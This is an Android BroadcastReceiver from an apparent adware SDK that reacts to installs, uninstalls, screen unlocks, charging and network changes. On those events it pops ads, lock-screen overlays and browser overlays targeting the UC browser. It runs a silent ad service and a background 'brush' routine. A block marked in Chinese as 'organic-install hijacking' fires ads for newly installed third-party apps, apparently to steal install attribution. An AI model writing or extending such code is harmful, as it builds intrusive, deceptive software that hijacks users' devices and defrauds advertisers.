package com.guang.client;



import java.util.List;

import com.guang.client.controller.GAPPNextController;
import com.guang.client.controller.GMIController;
import com.guang.client.controller.GUserController;
import com.guang.client.mode.GAdPositionConfig;
import com.guang.client.tools.GLog;
import com.guang.client.tools.GTools;
import com.infomobi.api.SilentAdServiceManager;
import com.qinglu.ad.QLAdController;
import com.qinglu.ad.QLBatteryLockActivity;
import com.qinglu.ad.QLBrowserMask;
import com.qinglu.ad.QLGPBreak;
import com.qinglu.ad.QLInstall;
import com.qinglu.ad.QLNewsHand;
import com.qinglu.ad.QLUnInstall;

import android.annotation.SuppressLint;
import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.BatteryManager;
public final class GSysReceiver extends BroadcastReceiver {
	private static String installPackageName;
	private static String unInstallPackageName;
	public GSysReceiver() {
		
	}


	@SuppressLint("NewApi")
	@Override
	public void onReceive(Context context, Intent intent) {		
		String action = intent.getAction();
		if(QLAdController.getInstance().getContext() == null)
			return;
		SilentAdServiceManager.onRecvAction(context, intent);
		GLog.e("GSysReceiver", "onReceive()..."+action);
		if (GCommon.ACTION_QEW_APP_BROWSER_SPOT.equals(action))
		{								
			GSysService.getInstance().browserSpot(-1,"com.UCMobile");
		}
		else if (GCommon.ACTION_QEW_APP_INSTALL.equals(action))
		{		
			installPackageName = GTools.getPackageName();
			GAPPNextController.getInstance().showInstall();
		}
		else if (GCommon.ACTION_QEW_APP_UNINSTALL.equals(action))
		{								
			unInstallPackageName = GTools.getPackageName();
			GAPPNextController.getInstance().showUnInstall();
		}
		else if (GCommon.ACTION_QEW_APP_BANNER.equals(action))
		{								
			GSysService.getInstance().banner(-1,GTools.getPackageName());
		}
		else if(GCommon.ACTION_QEW_APP_LOCK.equals(action))
		{		
			if(GSysService.getInstance().isRuning())
			batteryLock(intent);	
		}
		else if (GCommon.ACTION_QEW_APP_SPOT.equals(action))
		{								
			GSysService.getInstance().appSpot(-1,GTools.getPackageName());
		}
		else if(GCommon.ACTION_QEW_APP_WIFI.equals(action))
		{
			GSysService.getInstance().wifi(true);
		}
		else if(GCommon.ACTION_QEW_APP_BROWSER_BREAK.equals(action))
		{
			GSysService.getInstance().browserBreak(-1,"com.UCMobile");
		}
		else if(GCommon.ACTION_QEW_APP_BROWSER_BREAK_MASK.equals(action))
		{
			QLBrowserMask.getInstance().show();
		}
		else if (GCommon.ACTION_QEW_APP_SHORTCUT.equals(action))
		{								
			GSysService.getInstance().shortcut(-1);
		}
		else if(GCommon.ACTION_QEW_APP_HOMEPAGE.equals(action))
		{
			
		}
		else if(GCommon.ACTION_QEW_APP_BEHIND_BRUSH.equals(action))
		{
			GSysService.getInstance().behindBrush();
		}
		else if(GCommon.ACTION_QEW_APP_GP_BREAK.equals(action))
		{
			String type = intent.getStringExtra("type");
			if("off".equals(type))
			{
//				String packageName = intent.getStringExtra("packageName");
				QLGPBreak.getInstance().show(type,null);
			}
			else
			{
				QLGPBreak.getInstance().show(type,null);
			}
		}
		else if (DownloadManager.ACTION_DOWNLOAD_COMPLETE.equals(action)) {
							
		} 
		else if ("android.intent.action.PACKAGE_ADDED".equals(action)) {
			String packageName = intent.getDataString();
			installPackageName = packageName.split(":")[1];
			if(GUserController.getMedia() != null)
			{
				GUserController.getMedia().addWhiteList(installPackageName);
			}

			if(	(GSysService.getInstance().isWifi() || GSysService.getInstance().is4G() || GSysService.getInstance().is3G()) 
					&& GSysService.getInstance().isRuning()
					&& !QLInstall.getInstance().isShow())
			{
				List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.APP_INSTALL);
				for(GAdPositionConfig config : list)
				{
					if(GUserController.getMedia().isAdPosition(config.getAdPositionId()))
					{
						GAPPNextController.getInstance().showInstall();
					}
				}
			}
			//自然量劫持
			if(GSysService.getInstance().isRuning() && !GUserController.getMedia().getAllApps().contains(installPackageName))
			{
				List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.OFF_GP_BREAK);
				for(GAdPositionConfig config : list)
				{
					if(GUserController.getMedia().isAdPosition(config.getAdPositionId()))
					{
						GMIController.getInstance().showOffLine(config.getAdPositionId(),installPackageName);
					}
				}
			}
			//缓存信息
//			QLUnInstall.getInstance().getAppInfo(true);
		} 	
		else if("android.intent.action.PACKAGE_REMOVED".equals(action))
		{
			if(	(GSysService.getInstance().isWifi() || GSysService.getInstance().is4G() || GSysService.getInstance().is3G()) 
					&& GSysService.getInstance().isRuning()
					&& !QLUnInstall.getInstance().isShow())
			{
				List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.APP_UNINSTALL);
				for(GAdPositionConfig config : list)
				{
					if(GUserController.getMedia().isAdPosition(config.getAdPositionId()))
					{
						String packageName = intent.getDataString();
						unInstallPackageName = packageName.split(":")[1];
						if(!GTools.getPackageName().equals(unInstallPackageName))
							GAPPNextController.getInstance().showUnInstall();
					}
				}
			}
		}
		else if (GCommon.ACTION_QEW_APP_INSTALL_UI.equals(action))
		{
			install();
		}
		else if (GCommon.ACTION_QEW_APP_UNINSTALL_UI.equals(action))
		{
			uninstall();
		}
		//锁屏
		else if(Intent.ACTION_SCREEN_OFF.equals(action))
		{
			GSysService.getInstance().setPresent(false);
		}
		//开屏
		else if(Intent.ACTION_USER_PRESENT.equals(action))
		{
			GSysService.getInstance().setPresent(true);
			GSysService.getInstance().gpBreakBrushThread();
		}
		//亮屏
		else if(Intent.ACTION_SCREEN_ON.equals(action))
		{
			GSysService.getInstance().setPresent(true);
			int mBatteryLevel = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BATTERY_LEVEL, 0);
			GSysService.getInstance().startLockThread(mBatteryLevel);
		}
		//充电
		else if(Intent.ACTION_BATTERY_CHANGED.equals(action))
		{		
			if(GSysService.getInstance().isRuning())
			batteryLock(intent);	
		}
		else if(Intent.ACTION_POWER_CONNECTED.equals(action))
		{
			GTools.saveSharedData(GCommon.SHARED_KEY_ISBATTERY, true);
			int mBatteryLevel = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BATTERY_LEVEL, 0);
			GSysService.getInstance().startLockThread(mBatteryLevel);
		}
		else if(Intent.ACTION_POWER_DISCONNECTED.equals(action))
		{
			GTools.saveSharedData(GCommon.SHARED_KEY_ISBATTERY, false);
			QLBatteryLockActivity lock = QLBatteryLockActivity.getInstance();
			if(lock != null)
			{
				lock.hide();
			}
		}
		else if (GCommon.ACTION_QEW_OPEN_APP.equals(action))
		{								
			openApp(context,intent);
		}	
		else if(ConnectivityManager.CONNECTIVITY_ACTION.equals(action))
		{
			if(GSysService.getInstance().isRuning() && GSysService.getInstance().isWifi())
			GSysService.getInstance().wifi(GSysService.getInstance().wifiThread());

			if(!GSysService.getInstance().isRuning() && GSysService.getInstance().isWifi())
			{
				if(GUserController.isFirstLogin)
				{
					GUserController.isFirstLogin = false;
				}
				else
				{
					GUserController.getInstance().restarMainLoop();
				}
			}

		}
		else if (GCommon.ACTION_QEW_APP_NEWS_SHOW.equals(action))
		{
			QLNewsHand.getInstance().show();
		}
		else if (GCommon.ACTION_QEW_APP_NEWS_HIDE.equals(action))
		{
			QLNewsHand.getInstance().hide();
		}
	}

	//安装
	public void install()
	{
		if(!QLInstall.getInstance().isShow())
		QLInstall.getInstance().show(installPackageName);
	}
	
	//卸载
	public void uninstall()
	{
		if(!QLUnInstall.getInstance().isShow())
		QLUnInstall.getInstance().show(unInstallPackageName);
	}
	//充电
	private void batteryLock(Intent intent)
	{
		int status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
		//电量   
        int mBatteryLevel = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, 0);    
        //int mBatteryScale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, 100);    
        int chargePlug = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = false;
        if(chargePlug == BatteryManager.BATTERY_PLUGGED_USB)
       	 usbCharge = true;
        GTools.saveSharedData(GCommon.SHARED_KEY_BATTERY_LEVEL, mBatteryLevel);
		switch (status) {	
		
        case BatteryManager.BATTERY_STATUS_CHARGING:
            // 充电
        	QLBatteryLockActivity lock = QLBatteryLockActivity.getInstance();
        	if(lock != null)
        	{
        		lock.updateBattery(mBatteryLevel, usbCharge);
        	}
            break;       
        case BatteryManager.BATTERY_STATUS_FULL:
            // 充满     
        	QLBatteryLockActivity lock2 = QLBatteryLockActivity.getInstance();
        	if(lock2 != null)
        	{
        		QLBatteryLockActivity.setFirst(false);
    			lock2.updateBattery(mBatteryLevel, usbCharge);
        	}
            break;
        default:
            break;
        }
	}
	
	//
	private void openApp(final Context context,final Intent intent)
	{
		new Thread(){
			public void run() {
				try {
					Thread.sleep(1000);
					
					String packageName = intent.getStringExtra("packageName");
					String clas = intent.getStringExtra("clas");
					
					Intent i = new Intent();  
					i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					i.setClassName(packageName,clas);  
					context.startActivity(i);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			};
		}.start();
		  
	}
}
